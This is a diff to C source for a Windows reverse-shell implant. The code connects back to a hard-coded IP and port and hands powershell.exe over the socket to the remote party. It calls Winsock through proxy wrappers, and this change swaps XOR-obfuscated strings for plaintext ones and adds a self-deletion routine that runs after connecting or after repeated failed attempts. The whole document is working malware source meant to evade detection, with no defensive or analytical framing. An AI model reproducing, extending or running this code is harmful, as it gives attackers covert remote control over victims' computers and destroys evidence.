@@ -4,6 +4,7 @@
 // #pragma comment(lib,"ws2_32")
 
 #include "proxy_funck.c"
+#include "proto_func.h"
 
 int Reverse_Shell()
 {
@@ -13,33 +14,22 @@ int Reverse_Shell()
     WSADATA wsaData;
     SOCKET Winsock;
     struct sockaddr_in hax; 
-    
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
 
-    // char ip_addr[16] = "ip"; 
-    // const char temp_ip_addr[] = { ip };
-    char temp_ip_addr[14] = {};
-    Xor_Encrypt(temp_ip_addr, strlen(temp_ip_addr), key);
-    const char *ip_addr = temp_ip_addr;
-    
-    // char port[6] = "56808";            
-    // const char temp_port[] = { '5','6','8','0','8','\0' };
-    char temp_port[6] = {0x63, 0x75, 0x7F, 0x64, 0x7D, 0x00 };
-    Xor_Encrypt(temp_port, strlen(temp_port), key);
-    const char *port = temp_port;
+    char ip_addr_utka[] = "192.168.1.1"; 
+    char port_utka[] = "8080";
 
-    for (;;){
+    for (int i=0;;i++){
 
         ProxyWSAStartup(MAKEWORD(2, 2), &wsaData);
         Winsock = ProxyWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
         struct hostent *host; 
-        host = Proxy_gethostbyname(ip_addr);
-        strcpy_s(ip_addr, 16, Proxy_inet_ntoa(*((struct in_addr *)host->h_addr)));
+        host = Proxy_gethostbyname(ip_addr_utka);
+        strcpy_s(ip_addr_utka, 16, Proxy_inet_ntoa(*((struct in_addr *)host->h_addr)));
 
         hax.sin_family = AF_INET;
-        hax.sin_port = Proxy_htons(Proxy_atoi(port));
-        hax.sin_addr.s_addr = Proxy_inet_addr(ip_addr);
+        hax.sin_port = Proxy_htons(Proxy_atoi(port_utka));
+        hax.sin_addr.s_addr = Proxy_inet_addr(ip_addr_utka);
 
         int result;
         result = Proxy_WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
@@ -52,14 +42,19 @@ int Reverse_Shell()
             ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
 
             // TCHAR cmd[255] = TEXT("powershell.exe");
-            // TCHAR cmd[255] = { 'p','o','w','e','r','s','h','e','l','l','.','e','x','e','\0' };
-            char cmd[15] = {0x26, 0x2C, 0x30, 0x31, 0x37, 0x22, 0x3B, 0x29, 0x2A, 0x20, 0x7F, 0x29, 0x2B, 0x21, 0x00 };
-            Xor_Encrypt(cmd, strlen(cmd), key);
+            char cmd_utka[] = "powershell.exe";
 
-            ProxyCreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
+            ProxyCreateProcessA(NULL, cmd_utka, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
+
+            SelfDestruction();                      // После того как произошло подлкючение по reverse shell, удаляем файл
+
             }
         else
             ProxySleep(60000);
+            
+            if (i > 9) {
+                SelfDestruction();                  // Так же если прошло больше n попыток подключения, удаляем файл
+            }
     }
     
     return 0;
